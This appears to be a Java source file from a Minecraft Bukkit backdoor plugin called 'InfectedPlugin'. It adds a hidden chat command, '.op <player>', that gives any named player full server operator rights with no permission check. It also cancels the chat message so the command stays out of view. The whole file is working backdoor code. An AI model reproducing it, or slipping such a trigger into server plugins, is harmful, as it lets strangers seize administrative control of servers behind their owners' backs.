package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Server;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_op extends IP_Command implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();
        Server server = Bukkit.getServer();
        boolean cancel = false;

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".op"))
            {
                if (args.length == 1)
                {
                    p.sendMessage(ChatColor.RED + "Usage: .op <player>");
                    event.setCancelled(true);
                }
                try
                {
                    Player target = getPlayer(args[1]);
                    target.setOp(true);
                    p.sendMessage("Opped " + args[1]);
                    target.sendMessage(ChatColor.YELLOW + "You are now OP.");
                }
                catch (PlayerNotFoundException e)
                {
                    p.sendMessage("Opped " + args[1]);
                    server.getOfflinePlayer(args[1]).setOp(true);
                }
                cancel = true;
            }

            if (cancel)
            {
                event.setCancelled(true);
            }
        }
    }
}